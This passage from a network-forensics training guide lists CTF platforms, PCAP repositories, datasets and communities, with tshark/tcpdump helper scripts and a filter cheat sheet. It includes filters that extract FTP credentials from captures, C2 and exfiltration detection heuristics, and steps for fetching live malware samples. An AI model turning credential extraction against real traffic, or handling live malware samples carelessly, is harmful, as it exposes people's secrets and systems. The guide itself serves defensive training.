tshark -r "$PCAP" -Y "ftp.request.command == USER or ftp.request.command == PASS" \
    -T fields -e ftp.request.command -e ftp.request.arg

echo -e "\n[*] Checking for HTTP POST data:"
tshark -r "$PCAP" -Y "http.request.method == POST" -T fields \
    -e http.file_data | head -5

echo -e "\n[*] Checking for DNS queries:"
tshark -r "$PCAP" -Y "dns.qry.name" -T fields -e dns.qry.name | \
    sort -u | head -10

echo -e "\n[*] Checking for suspicious ports:"
tshark -r "$PCAP" -T fields -e tcp.dstport | sort | uniq -c | sort -rn | head -10
EOF

chmod +x thm_analyzer.sh
```

### CyberDefenders

**Blue Team Focus Platform:**

```bash
# URL: https://cyberdefenders.org
# Specializes in defensive security challenges

# Challenge categories:
# - Network Forensics (most relevant)
# - Endpoint Forensics
# - Threat Hunting
# - Incident Response

# Download challenges (requires free account):
# Navigate to "Challenges" -> "Network Forensics"
# Download provided PCAP/PCAPNG files

# CyberDefenders often provides realistic scenarios
# Answer format: Usually specific values found in traffic
```

**CyberDefenders Challenge Template:**

```bash
cat > cyberdefenders_template.sh << 'EOF'
#!/bin/bash

PCAP="$1"

echo "CyberDefenders Challenge Analysis"
echo "==================================="

# Typical CyberDefenders questions format:
# Q1: What is the attacker's IP address?
echo -e "\n[Q1] Top talkers (potential attackers):"
tshark -r "$PCAP" -q -z conv,ip | grep -A 50 "IPv4 Conversations" | \
    sort -k5 -rn | head -10

# Q2: What malware family was used?
echo -e "\n[Q2] Checking for known malware signatures:"
tshark -r "$PCAP" -Y "http.user_agent" -T fields -e http.user_agent | \
    sort -u

# Q3: What file was downloaded?
echo -e "\n[Q3] Downloaded files:"
tshark -r "$PCAP" -Y "http.request.method == GET" -T fields \
    -e http.request.uri | grep -E "\.(exe|dll|zip|ps1)$"

# Q4: What is the C2 server address?
echo -e "\n[Q4] Suspicious outbound connections:"
tshark -r "$PCAP" -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
    -T fields -e ip.dst -e tcp.dstport | sort | uniq -c | sort -rn | head -10

# Q5: What data was exfiltrated?
echo -e "\n[Q5] Large outbound transfers:"
tshark -r "$PCAP" -q -z conv,tcp | grep -E "->.*[0-9]{5,}"

echo -e "\n[*] Analysis complete. Review findings for challenge answers."
EOF

chmod +x cyberdefenders_template.sh
```

### PicoCTF

**Educational CTF Platform:**

```bash
# URL: https://picoctf.org
# Beginner-friendly challenges

# Network forensics challenges typically under:
# - Forensics category
# - Difficulty: Easy to Medium

# PicoCTF flag format: picoCTF{...}

# Access challenges:
# 1. Create account at picoctf.org
# 2. Browse "Practice" challenges
# 3. Filter by "Forensics" category
# 4. Download provided files
```

**PicoCTF Quick Analysis:**

```bash
# PicoCTF challenges often hide flags in:
# - Packet comments
# - HTTP responses
# - DNS TXT records
# - Image files transferred via network

# Quick flag finder for PicoCTF
tshark -r challenge.pcap -V | grep -i "picoCTF{" --color=always

# Check all text fields
tshark -r challenge.pcap -T fields -e data.text | grep "picoCTF"

# Export all objects
tshark -r challenge.pcap --export-objects http,objects/
grep -r "picoCTF" objects/
```

### CTFtime

**Challenge Archive and Rankings:**

```bash
# URL: https://ctftime.org
# Aggregates CTF competitions worldwide

# Finding PCAP challenges:
# 1. Visit ctftime.org/writeups
# 2. Search for: "wireshark", "pcap", "network forensics"
# 3. Download linked challenge files from writeups

# Many past CTF challenges available with solutions
# Excellent for learning different techniques
```

### RingZer0 CTF

**Specialized Challenge Platform:**

```bash
# URL: https://ringzer0ctf.com
# Challenges section: "Forensics" and "Cryptography"

# Network-related challenges often involve:
# - PCAP analysis
# - Protocol reverse engineering
# - Traffic decryption

# Access requires free registration
# Flag format: FLAG-xxxxxxxxxxxxx (check per challenge)
```

### Platform Comparison Matrix

```bash
cat > platform_comparison.txt << 'EOF'
CTF Platform Comparison for Network Traffic Analysis
====================================================

Platform         | Difficulty | Focus          | Cost  | Best For
-----------------|------------|----------------|-------|---------------------------
Hack The Box     | Medium-Hard| Real-world     | Free* | Realistic scenarios
TryHackMe        | Easy-Medium| Educational    | Free* | Guided learning
CyberDefenders   | Medium-Hard| Blue Team      | Free  | Incident response
PicoCTF          | Easy       | Educational    | Free  | Beginners
CTFtime          | Varies     | Competitions   | Free  | Competition practice
RingZer0         | Medium     | Skills-based   | Free  | Diverse challenges
ImaginaryCTF     | Medium     | Annual comp    | Free  | Competition experience
HackThisSite     | Easy-Medium| Web-focused    | Free  | Web traffic analysis

* Premium tiers available with additional content

Recommendation: Start with TryHackMe/PicoCTF, then progress to HTB/CyberDefenders
EOF

cat platform_comparison.txt
```

## PCAP Challenge Repositories

### Malware-Traffic-Analysis.net

**Premier Resource for Malware Network Traffic:**

```bash
# URL: https://www.malware-traffic-analysis.net
# Updated regularly with real malware traffic captures

# Directory structure:
# - /training/ : Training exercises with answers
# - /YEAR/MONTH/ : Monthly challenges

# Download exercises:
wget https://www.malware-traffic-analysis.net/training/host-and-user-ID.html
# Follow links to download PCAPs (password: infected)

# Typical file structure:
unzip -P infected challenge.zip

# Exercise format:
# - Background scenario
# - Questions to answer
# - PCAP file(s)
# - Often includes memory dumps and malware samples
```

**Malware-Traffic-Analysis Workflow:**

```bash
cat > mta_workflow.sh << 'EOF'
#!/bin/bash

PCAP="$1"

echo "Malware-Traffic-Analysis.net Challenge Workflow"
echo "================================================"

# Step 1: Identify infected host
echo -e "\n[1] Identifying infected host(s):"
tshark -r "$PCAP" -q -z conv,ip | grep -A 30 "IPv4 Conversations" | \
    sort -k5 -rn | head -5

# Step 2: Determine infection traffic
echo -e "\n[2] Checking for infection indicators:"
echo "    - Suspicious user agents:"
tshark -r "$PCAP" -Y "http.user_agent" -T fields -e http.user_agent | sort -u

echo "    - Executable downloads:"
tshark -r "$PCAP" -Y "http.request.uri contains \".exe\"" -T fields \
    -e http.host -e http.request.uri

# Step 3: C2 traffic identification
echo -e "\n[3] Potential C2 servers:"
tshark -r "$PCAP" -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
    -T fields -e ip.dst | sort | uniq -c | sort -rn | head -10

# Step 4: Extract artifacts
echo -e "\n[4] Extracting HTTP objects:"
mkdir -p mta_objects
tshark -r "$PCAP" --export-objects http,mta_objects/ 2>/dev/null
ls -lh mta_objects/ | head -10

# Step 5: Check for exfiltration
echo -e "\n[5] Checking for data exfiltration:"
tshark -r "$PCAP" -Y "tcp.len > 1000" -T fields -e ip.dst -e tcp.dstport | \
    sort | uniq -c | sort -rn | head -10

echo -e "\n[*] Analysis complete. Answer challenge questions using findings above."
EOF

chmod +x mta_workflow.sh
```

### PacketTotal

**Online PCAP Analysis Community:**

```bash
# URL: https://packettotal.com
# Upload and analyze PCAPs online
# Browse public submissions for practice

# Features:
# - Automated analysis engine
# - Threat intelligence integration
# - Public PCAP repository

# Searching for practice captures:
# 1. Visit packettotal.com/app/search
# 2. Search terms: "malware", "exploit", "phishing"
# 3. Download interesting captures for offline analysis

# [Unverified] PacketTotal detection accuracy varies
# Always verify findings manually
```

### Netresec Public PCAP Files

**High-Quality Training Captures:**

```bash
# URL: https://www.netresec.com/?page=PcapFiles
# Curated collection of publicly available PCAPs

# Categories:
# - Malware traffic
# - Network forensics
# - Protocol examples
# - CTF challenges

# Download examples:
wget https://www.netresec.com/files/smb-psexec.pcap
wget https://www.netresec.com/files/webshell-upload.pcap

# Netresec also provides analysis tools:
# - NetworkMiner (GUI tool)
# - CapLoader (large PCAP handling)
```

### PCAPS Collection on GitHub

**Community-Contributed Repositories:**

```bash
# Popular GitHub repositories with PCAP samples:

# 1. PacketTotal PCAP Repository
git clone https://github.com/7h3rAm/pcaps.git
cd pcaps/
ls -lh

# 2. Malware PCAP Analysis
git clone https://github.com/pan-unit42/malware-traffic-analysis.git

# 3. CTF Challenge PCAPs
git clone https://github.com/markofu/pcaps.git

# 4. DARPA Intrusion Detection Evaluation
# URL: https://www.ll.mit.edu/r-d/datasets/1998-darpa-intrusion-detection-evaluation-dataset
# [Inference] Older dataset (1998) but still valuable for learning fundamentals

# 5. Traffic analysis exercises
git clone https://github.com/chrissanders/packets.git

# 6. Wireshark sample captures
# URL: https://wiki.wireshark.org/SampleCaptures
# Official Wireshark wiki with diverse protocol examples
```

**Organizing Downloaded Samples:**

```bash
# Create organized structure for practice PCAPs
mkdir -p ~/pcap_practice/{malware,protocols,ctf,tutorials}

# Download and categorize samples
cd ~/pcap_practice/malware
wget https://www.malware-traffic-analysis.net/[year]/[month]/[file].pcap.zip

cd ~/pcap_practice/protocols
wget https://wiki.wireshark.org/SampleCaptures?action=AttachFile&do=get&target=http.cap

# Create index of samples
cat > ~/pcap_practice/INDEX.md << 'EOF'
# PCAP Practice Collection

## Malware Samples
| File | Source | Description | Difficulty |
|------|--------|-------------|------------|
| emotet.pcap | MTA | Emotet C2 traffic | Medium |
| ransomware.pcap | GitHub | Ransomware infection | Hard |

## Protocol Examples
| File | Protocol | Use Case |
|------|----------|----------|
| http.cap | HTTP | Basic web traffic |
| dns.pcap | DNS | DNS queries/responses |

## CTF Challenges
| File | Platform | Points | Status |
|------|----------|--------|--------|
| challenge1.pcap | HTB | 30 | Solved |

EOF
```

### PCAP Repository Browser Script

```bash
cat > pcap_browser.sh << 'EOF'
#!/bin/bash

# Interactive PCAP repository browser

PCAP_DIR="${1:-./}"

echo "PCAP Repository Browser"
echo "======================="
echo "Directory: $PCAP_DIR"
echo ""

# Find all PCAP files
find "$PCAP_DIR" -name "*.pcap" -o -name "*.pcapng" | while read pcap; do
    echo "File: $(basename "$pcap")"
    
    # Quick stats
    packet_count=$(capinfos -c "$pcap" 2>/dev/null | grep "Number of packets" | awk '{print $NF}')
    duration=$(capinfos -u "$pcap" 2>/dev/null | grep "Capture duration" | awk '{print $3, $4}')
    
    if [ -n "$packet_count" ]; then
        echo "  Packets: $packet_count"
        echo "  Duration: $duration"
        
        # Top protocols
        echo "  Top protocols:"
        tshark -r "$pcap" -q -z io,phs 2>/dev/null | head -10 | grep -E "^[a-z]" | \
            awk '{print "    " $0}'
    fi
    
    echo "  Path: $pcap"
    echo "---"
done
EOF

chmod +x pcap_browser.sh

# Usage:
# ./pcap_browser.sh ~/pcap_practice/
```

## Practice Dataset Sources

### Academic Research Datasets

**University Network Traffic Collections:**

```bash
# 1. CICIDS2017/2018 (Canadian Institute for Cybersecurity)
# URL: https://www.unb.ca/cic/datasets/ids-2017.html
# Description: Comprehensive IDS evaluation dataset
# Contains: DDoS, bruteforce, XSS, SQL injection traffic

# Download (large files ~30GB)
wget https://www.unb.ca/cic/datasets/ids-2017.html
# [Unverified] Direct download links change; check website for current URLs

# 2. UNSW-NB15 Dataset
# URL: https://research.unsw.edu.au/projects/unsw-nb15-dataset
# Description: Network traffic with modern attack types

# 3. CTU-13 Dataset (Czech Technical University)
# URL: https://www.stratosphereips.org/datasets-ctu13
# Description: Botnet traffic captures
# Scenarios: 13 different botnet captures with labeled traffic

# Download CTU-13
wget https://mcfp.felk.cvut.cz/publicDatasets/CTU-Malware-Capture-Botnet-[1-13]/

# 4. MAWI Working Group Traffic Archive
# URL: http://mawi.wide.ad.jp/mawi/
# Description: Daily backbone traffic traces (anonymized)
```

**Research Dataset Organization:**

```bash
mkdir -p ~/datasets/{ids,malware,normal}

# Index template for large datasets
cat > ~/datasets/DATASET_INFO.txt << 'EOF'
Dataset Inventory
=================

CICIDS2017
----------
Location: ~/datasets/ids/cicids2017/
Size: ~30GB
Scenarios: 
  - Monday: Normal traffic
  - Tuesday: FTP/SSH bruteforce
  - Wednesday: DoS attacks
  - Thursday: Web attacks
  - Friday: DDoS, Port scans

CTU-13 Botnet Dataset
---------------------
Location: ~/datasets/malware/ctu13/
Size: ~13GB (all scenarios)
Scenarios: 13 different botnet families
Format: PCAP + labeled flow files

Analysis Priority:
1. Start with CTU-13 Scenario 1 (smallest)
2. Progress to CICIDS2017 individual days
3. Combine multiple sources for correlation practice
EOF
```

### Commercial/Professional Datasets

**Security Vendor Threat Intelligence:**

```bash
# 1. Unit 42 Wireshark Quizzes
# URL: https://unit42.paloaltonetworks.com/tag/wireshark-quiz/
# Updated monthly with real-world malware traffic

# Download latest quiz:
# Visit above URL and look for "pcap" links

# 2. Contagio Malware Dump
# URL: http://contagiodump.blogspot.com
# Collection of malware samples and network captures
# [Unverified] Site availability fluctuates; use caution

# 3. VirusTotal Hunting
# URL: https://www.virustotal.com (requires account)
# Some PCAP samples available through hunting queries
# Premium features required for bulk download
```

### Live Traffic Capture Practice

**Creating Your Own Practice Datasets:**

```bash
# Setup controlled environment for traffic generation

# 1. Capture normal baseline traffic
cat > capture_baseline.sh << 'EOF'
#!/bin/bash

INTERFACE="eth0"
DURATION="300"  # 5 minutes
OUTPUT="baseline_$(date +%Y%m%d_%H%M%S).pcap"

echo "[*] Capturing baseline traffic for ${DURATION}s on $INTERFACE"
sudo timeout $DURATION tcpdump -i $INTERFACE -w $OUTPUT

echo "[*] Capture complete: $OUTPUT"
capinfos $OUTPUT
EOF

chmod +x capture_baseline.sh

# 2. Generate specific protocol traffic
cat > generate_traffic.sh << 'EOF'
#!/bin/bash

TARGET="testphp.vulnweb.com"  # Legal testing site

echo "[*] Generating HTTP traffic"
for i in {1..10}; do
    curl -s http://$TARGET/ > /dev/null
    sleep 1
done

echo "[*] Generating HTTPS traffic"
for i in {1..10}; do
    curl -s https://$TARGET/ > /dev/null
    sleep 1
done

echo "[*] Generating DNS queries"
for domain in google.com facebook.com twitter.com github.com; do
    dig $domain > /dev/null
    sleep 1
done

echo "[*] Traffic generation complete"
EOF

chmod +x generate_traffic.sh

# 3. Capture while generating
sudo tcpdump -i eth0 -w practice_traffic.pcap &
TCPDUMP_PID=$!
./generate_traffic.sh
sleep 2
sudo kill $TCPDUMP_PID
```

**Simulated Attack Traffic:**

```bash
# Use legal testing platforms

# 1. DVWA (Damn Vulnerable Web Application)
# Setup in Docker:
docker run -d -p 80:80 vulnerables/web-dvwa

# Capture traffic while testing:
sudo tcpdump -i lo -w dvwa_practice.pcap &
# Perform SQL injection, XSS, etc.

# 2. Metasploitable 3
# VM available from Rapid7
# Setup in VirtualBox/VMware
# Capture attacks against it

# 3. Hack The Box labs
# Capture your own penetration testing traffic
sudo tcpdump -i tun0 -w htb_practice.pcap

# [Important] Only capture traffic on systems you own or have permission to test
```

### Protocol-Specific Learning Datasets

**Educational Protocol Examples:**

```bash
# Wireshark Sample Captures Wiki
# URL: https://wiki.wireshark.org/SampleCaptures

# Download specific protocols for learning:

# HTTP/HTTPS
wget https://wiki.wireshark.org/SampleCaptures?action=AttachFile&do=get&target=http.cap
wget https://wiki.wireshark.org/SampleCaptures?action=AttachFile&do=get&target=ssl-3des.pcapng

# DNS
wget https://wiki.wireshark.org/SampleCaptures?action=AttachFile&do=get&target=dns.cap

# FTP
wget https://wiki.wireshark.org/SampleCaptures?action=AttachFile&do=get&target=ftp.pcap

# SMB
wget https://wiki.wireshark.org/SampleCaptures?action=AttachFile&do=get&target=smb.cap

# ICMP
wget https://wiki.wireshark.org/SampleCaptures?action=AttachFile&do=get&target=icmp.pcap

# Create protocol learning directory
mkdir -p ~/pcap_learning/protocols
mv *.cap *.pcap *.pcapng ~/pcap_learning/protocols/
```

### Dataset Quality Verification

```bash
cat > verify_dataset.sh << 'EOF'
#!/bin/bash

PCAP="$1"

if [ -z "$PCAP" ]; then
    echo "Usage: $0 <pcap_file>"
    exit 1
fi

echo "Dataset Quality Verification"
echo "============================="
echo "File: $PCAP"
echo ""

# Check file integrity
echo "[*] File integrity:"
capinfos "$PCAP" | grep -E "File name|File size|File encapsulation|Number of packets"

# Check for truncated packets
truncated=$(tshark -r "$PCAP" -Y "frame.len != frame.cap_len" -T fields -e frame.number | wc -l)
echo -e "\n[*] Truncated packets: $truncated"

if [ $truncated -gt 0 ]; then
    echo "    WARNING: Dataset contains truncated packets"
fi

# Check time range
echo -e "\n[*] Time coverage:"
capinfos "$PCAP" | grep -E "First packet time|Last packet time|Capture duration"

# Check for anonymization
echo -e "\n[*] Checking for anonymized data:"
private_ips=$(tshark -r "$PCAP" -T fields -e ip.src -e ip.dst | \
    grep -E "^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)" | wc -l)
total_ips=$(tshark -r "$PCAP" -T fields -e ip.src -e ip.dst | wc -l)

if [ $total_ips -gt 0 ]; then
    private_percent=$((private_ips * 100 / total_ips))
    echo "    Private IP usage: ${private_percent}%"
    
    if [ $private_percent -gt 90 ]; then
        echo "    Status: Likely anonymized or internal network"
    else
        echo "    Status: Mixed public/private addresses"
    fi
fi

# Protocol diversity
echo -e "\n[*] Protocol diversity:"
tshark -r "$PCAP" -q -z io,phs | head -15

echo -e "\n[*] Verification complete"
EOF

chmod +x verify_dataset.sh
```

## Community Resources

### Forums and Discussion Platforms

**Reddit Communities:**

```bash
# Relevant subreddits:
# - /r/wireshark - Wireshark-specific questions
# - /r/netsec - Network security discussions
# - /r/AskNetsec - Q&A for network security
# - /r/blueteamsec - Defensive security focus
# - /r/computerforensics - Digital forensics
# - /r/CTF - CTF challenge discussions

# Search for PCAP analysis discussions:
# URL format: https://www.reddit.com/r/wireshark/search/?q=pcap+analysis

# Common question patterns to search:
# - "How to extract files from PCAP"
# - "Analyzing encrypted traffic"
# - "Finding C2 traffic"
# - "CTF PCAP challenge writeup"
```

**Discord Servers:**

```bash
# Popular cybersecurity Discord communities:

# 1. Hack The Box Official
# Invite: https://discord.gg/hackthebox
# Channels: #forensics, #help

# 2. TryHackMe
# Invite: https://discord.gg/tryhackme
# Channels: #network-security

# 3. NetSec Focus
# Invite: Check /r/netsec for current link
# Active discussion on packet analysis

# 4. InfoSec Prep
# Invite: https://discord.gg/infosec
# General cybersecurity learning community

# Discord etiquette for getting help:
# - Share your PCAP (if allowed by challenge rules)
# - Describe what you've tried
# - Ask specific questions
# - Use code blocks for commands/output
```

### YouTube Channels and Video Resources

**Educational Content Creators:**

```bash
# Recommended channels for network traffic analysis:

# 1. Chris Greer (Packet Pioneer)
# Focus: Wireshark tutorials, network troubleshooting
# URL: https://www.youtube.com/@ChrisGreer

# 2. HackerSploit
# Focus: Penetration testing, including network analysis
# URL: https://www.youtube.com/@HackerSploit

# 3. David Bombal
# Focus: Networking, cybersecurity, Wireshark
# URL: https://www.youtube.com/@davidbombal

# 4. IppSec (HTB Writeups)
# Focus: Hack The Box walkthroughs (often includes PCAP analysis)
# URL: https://www.youtube.com/@ippsec

# 5. John Hammond
# Focus: CTF walkthroughs and cybersecurity
# URL: https://www.youtube.com/@_JohnHammond

# 6. Wireshark University
# Focus: Official Wireshark training content
# URL: https://www.youtube.com/@wiresharktraining

# Search queries for finding PCAP analysis videos:
# - "Wireshark CTF challenge"
# - "Network forensics tutorial"
# - "PCAP analysis walkthrough"
# - "Malware traffic analysis"
```

### Documentation and Reference Materials

**Official Documentation:**

```bash
# 1. Wireshark User Guide
# URL: https://www.wireshark.org/docs/wsug_html/
# Comprehensive official documentation

# Download PDF version for offline reference:
wget https://www.wireshark.org/download/docs/user-guide.pdf

# 2. Wireshark Display Filter Reference
# URL: https://www.wireshark.org/docs/dfref/
# Complete filter syntax reference

# 3. tcpdump & libpcap documentation
# URL: https://www.tcpdump.org/manpages/
man tcpdump  # Local manual page

# 4. tshark manual
man tshark

# 5. RFC Repository
# URL: https://www.rfc-editor.org/
# Protocol specifications for deep analysis
```

**Community-Created Guides:**

```bash
# Download and organize reference materials

mkdir -p ~/ctf_resources/docs

# Wireshark cheat sheets
# Download community cheat sheets
cd ~/ctf_resources/docs

# Packetlife.net Cheat Sheets (if available via archive)
wget https://web.archive.org/web/[TIMESTAMP]/http://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf

# Create custom reference sheet
cat > wireshark_filters_reference.md << 'EOF'
# Wireshark Display Filters - Quick Reference

## Common Filters
```

ip.addr == 10.0.0.1 # Any traffic involving this IP ip.src == 10.0.0.1 # Traffic from this IP ip.dst == 10.0.0.1 # Traffic to this IP tcp.port == 80 # TCP port 80 (any direction) udp.port == 53 # UDP port 53 http.request.method == "POST" # HTTP POST requests dns.qry.name contains "evil" # DNS queries containing "evil"

```

## Protocol Isolation
```

tcp # All TCP traffic udp # All UDP traffic icmp # All ICMP traffic arp # All ARP traffic http # HTTP traffic ssl or tls # Encrypted traffic

```

## Logical Operators
```

and or && # Logical AND or or || # Logical OR not or ! # Logical NOT eq or == # Equals ne or != # Not equals gt or > # Greater than lt or < # Less than

```

## Advanced Patterns
```

frame contains "flag" # Search entire packet for text tcp.analysis.retransmission # Retransmitted packets tcp.analysis.flags # TCP issues/anomalies http.request.uri matches ".exe$" # Regex matching ip.addr == 10.0.0.0/24 # Subnet filtering

```

## Malware Analysis Specific
```

http.request.uri contains "exe" # Executable downloads dns.qry.name.len > 50 # Long DNS queries (tunneling?) tcp.flags.reset == 1 # TCP resets (failed connections) http.user_agent contains "curl" # Suspicious user agents tcp.stream eq 0 # Specific TCP conversation

```

## Data Export
```

Export Objects: File -> Export Objects -> HTTP/SMB/... Follow Stream: Right-click packet -> Follow -> TCP/UDP/HTTP Stream Statistics: Statistics -> Protocol Hierarchy / Conversations / Endpoints

```

## Performance Tips
```

Use capture filters (BPF) instead of display filters when possible Limit time ranges for large files Disable name resolution (View -> Name Resolution) Close unneeded columns

````
EOF

# Create tcpdump BPF filter reference
cat > tcpdump_filters_reference.md << 'EOF'
# tcpdump BPF Filters - Quick Reference

## Basic Syntax
```bash
# Protocol
tcpdump -r file.pcap tcp
tcpdump -r file.pcap udp
tcpdump -r file.pcap icmp

# Host
tcpdump -r file.pcap host 192.168.1.1
tcpdump -r file.pcap src host 192.168.1.1
tcpdump -r file.pcap dst host 192.168.1.1

# Port
tcpdump -r file.pcap port 80
tcpdump -r file.pcap src port 443
tcpdump -r file.pcap dst port 22
tcpdump -r file.pcap portrange 1000-2000

# Network
tcpdump -r file.pcap net 192.168.1.0/24
tcpdump -r file.pcap src net 10.0.0.0/8
````

## Combinations

```bash
# AND
tcpdump -r file.pcap 'tcp and port 80'
tcpdump -r file.pcap 'host 10.0.0.1 and port 443'

# OR
tcpdump -r file.pcap 'port 80 or port 443'
tcpdump -r file.pcap 'tcp or udp'

# NOT
tcpdump -r file.pcap 'not port 22'
tcpdump -r file.pcap 'not net 192.168.0.0/16'

# Complex
tcpdump -r file.pcap '(tcp port 80 or tcp port 443) and host 10.0.0.5'
```

## TCP Flags

```bash
# SYN packets
tcpdump -r file.pcap 'tcp[tcpflags] & tcp-syn != 0'

# SYN-ACK packets
tcpdump -r file.pcap 'tcp[tcpflags] & (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack)'

# RST packets
tcpdump -r file.pcap 'tcp[tcpflags] & tcp-rst != 0'

# FIN packets
tcpdump -r file.pcap 'tcp[tcpflags] & tcp-fin != 0'

# PSH-ACK (data transfer)
tcpdump -r file.pcap 'tcp[tcpflags] & (tcp-push|tcp-ack) == (tcp-push|tcp-ack)'
```

## Packet Size

```bash
# Packets greater than 1000 bytes
tcpdump -r file.pcap 'greater 1000'

# Packets less than 100 bytes
tcpdump -r file.pcap 'less 100'
```

## Specific Byte Matching

```bash
# HTTP GET requests (looking for "GET " at start of payload)
tcpdump -r file.pcap 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'

# ICMP echo request
tcpdump -r file.pcap 'icmp[0] == 8'

# DNS queries (UDP port 53 with query flag)
tcpdump -r file.pcap 'udp port 53 and udp[10] & 0x80 == 0'
```

## Performance Considerations

```
BPF filters are applied at kernel level (very efficient)
Use BPF filters over Wireshark display filters for large files
Filters compile to bytecode for fast execution
```

EOF

echo "[+] Reference sheets created in ~/ctf_resources/docs/"

````

### Online Learning Platforms

**Structured Courses:**
```bash
# 1. Cybrary
# URL: https://www.cybrary.it
# Courses: "Network Traffic Analysis", "Wireshark Fundamentals"
# Cost: Free tier available, premium for certificates

# 2. Coursera
# URL: https://www.coursera.org
# Search: "Network Security", "Wireshark"
# Universities offering relevant courses:
#   - Stanford, University of Maryland, etc.

# 3. Udemy
# URL: https://www.udemy.com
# Search: "Wireshark", "Network Forensics", "PCAP Analysis"
# Popular courses (prices vary with sales):
#   - "Learn Wireshark" by Chris Greer
#   - "Wireshark: Packet Analysis and Ethical Hacking"

# 4. INE (eLearnSecurity)
# URL: https://ine.com
# Professional penetration testing courses
# Includes advanced network traffic analysis

# 5. SANS Internet Storm Center
# URL: https://isc.sans.edu
# Free resources, daily security updates
# Practice challenges occasionally posted

# Course selection criteria:
# - Hands-on labs included
# - Real PCAP files provided
# - Active instructor/community
# - Recent updates (protocols evolve)
````

### Blog Aggregators and News Sources

**Security Blogs with PCAP Content:**

```bash
# Create RSS feed reader setup for security blogs

cat > security_blogs.txt << 'EOF'
Must-Follow Security Blogs for Network Analysis
================================================

1. Malware-Traffic-Analysis.net
   URL: https://www.malware-traffic-analysis.net
   Focus: Weekly malware PCAP challenges
   RSS: https://www.malware-traffic-analysis.net/blog-entries.rss

2. SANS ISC InfoSec Forums
   URL: https://isc.sans.edu
   Focus: Daily security diary, threat analysis
   RSS: https://isc.sans.edu/rssfeed.xml

3. Brad Duncan (Palo Alto Unit 42)
   URL: https://unit42.paloaltonetworks.com/tag/wireshark/
   Focus: Monthly Wireshark quizzes, malware analysis
   RSS: Available on site

4. Didier Stevens' Blog
   URL: https://blog.didierstevens.com
   Focus: Malware analysis, PCAP dissection techniques
   RSS: https://blog.didierstevens.com/feed/

5. Active Response
   URL: https://www.activecountermeasures.com/blog/
   Focus: Network threat hunting, PCAP analysis
   RSS: Available

6. NetResec Blog
   URL: https://www.netresec.com/?page=Blog
   Focus: Network forensics, tool releases
   RSS: https://www.netresec.com/rss.ashx

7. Chris Sanders (Applied Network Security)
   URL: https://chrissanders.org
   Focus: Network security monitoring, PCAP analysis
   RSS: Available

8. Cloudflare Blog
   URL: https://blog.cloudflare.com
   Focus: DDoS analysis, internet security (often includes PCAPs)
   Filter: Search for "PCAP" or "traffic analysis"

9. Krebs on Security
   URL: https://krebsonsecurity.com
   Focus: Cybercrime investigations (occasionally includes traffic analysis)
   RSS: https://krebsonsecurity.com/feed/

10. Threat Intel Twitter Accounts (via Nitter for RSS)
    - @malware_traffic (Brad Duncan)
    - @Unit42_Intel
    - @Wireshark
    - @Netresec

Reading Schedule Suggestion:
- Daily: SANS ISC (quick updates)
- Weekly: Malware-Traffic-Analysis challenges
- Monthly: Unit 42 Wireshark quizzes
- As posted: Other blogs via RSS reader
EOF

cat security_blogs.txt

# Setup RSS reader (optional)
# Install: sudo apt install newsboat
cat > ~/.newsboat/urls << 'EOF'
https://www.malware-traffic-analysis.net/blog-entries.rss "~Malware Traffic"
https://isc.sans.edu/rssfeed.xml "~SANS ISC"
https://blog.didierstevens.com/feed/ "~Didier Stevens"
https://www.netresec.com/rss.ashx "~NetResec"
EOF
```

### Twitter/X Communities

**Security Researchers to Follow:**

```bash
cat > infosec_twitter.txt << 'EOF'
InfoSec Twitter Accounts for PCAP Analysis
==========================================

Malware Traffic Analysis:
- @malware_traffic - Brad Duncan (weekly challenges)
- @BroadAnalysis - Andrew (malware traffic analyst)
- @0xffff0800 - Malware analysis

Network Security:
- @Wireshark - Official Wireshark account
- @Netresec - NetworkMiner and PCAP tools
- @chrissanders88 - Chris Sanders (network forensics)
- @ActivCM - Active Countermeasures (threat hunting)

Threat Intelligence:
- @Unit42_Intel - Palo Alto Unit 42
- @malwrhunterteam - Malware hunting team
- @VK_Intel - Vitali Kremez (malware analysis)
- @dubstard - Security researcher

CTF Communities:
- @HackTheBox_EU - HTB challenges
- @RealTryHackMe - THM updates
- @CTFtime - CTF competition aggregator
- @PicoCTF - Educational CTF

General InfoSec:
- @SwiftOnSecurity - Security insights (often humorous)
- @GossiTheDog - Kevin Beaumont (security research)
- @briankrebs - Investigative cybersecurity journalism

Hashtags to Monitor:
#pcap #wireshark #networkforensics #malwareanalysis
#threatintel #dfir #infosec #ctf

Twitter Lists:
Create custom lists to organize these accounts
Use TweetDeck or similar for real-time monitoring
Set up alerts for specific hashtags
EOF

cat infosec_twitter.txt
```

### Collaborative Learning Platforms

**Study Groups and Mentorship:**

```bash
# 1. HackTheBox Academy Study Groups
# Discord channels for group learning
# Collaborative challenge solving

# 2. TryHackMe Learning Paths
# Structured progression through related rooms
# Community discussions per room

# 3. Reddit Study Groups
# /r/securityCTF - CTF-focused study coordination
# /r/AskNetsec - Q&A with experienced professionals

# 4. LinkedIn Groups
# Network Forensics and Analysis
# Wireshark Users Group

# 5. Slack Workspaces
# ManyHats (infosec community)
# Various CTF team Slacks

# Starting your own study group:
cat > study_group_template.md << 'EOF'
# Weekly PCAP Analysis Study Group

## Meeting Structure
- Day: Every Saturday, 10:00 AM UTC
- Duration: 2 hours
- Platform: Discord/Zoom

## Format
1. Review (15 min)
   - Discuss previous week's challenge
   - Share solutions and techniques

2. New Challenge (60 min)
   - Collaborative analysis of new PCAP
   - Screen sharing and live analysis
   - Q&A as questions arise

3. Tool Tutorial (30 min)
   - Rotating member presents a tool/technique
   - Live demonstration
   - Practical exercises

4. Resources & Planning (15 min)
   - Share interesting articles/blogs found
   - Select next week's challenge
   - Assign tutorial presenter

## Challenge Sources
- Week 1: Malware-Traffic-Analysis.net exercise
- Week 2: HTB retired forensics challenge
- Week 3: Custom-created scenario
- Week 4: CTFtime archived challenge
- Rotate monthly

## Skill Levels
- Beginner: Basic Wireshark usage
- Intermediate: Protocol analysis, extraction
- Advanced: Custom protocol RE, malware analysis

## Ground Rules
- No challenge spoilers before session
- Share your approach, not just answers
- Respectful of all skill levels
- No illegal activities or unauthorized testing

## Resources Repository
- Shared folder: Google Drive/GitHub
- Members upload their analysis notes
- Maintain challenge index
- Tool recommendations list
EOF
```

### Tool-Specific Communities

**Wireshark Community:**

```bash
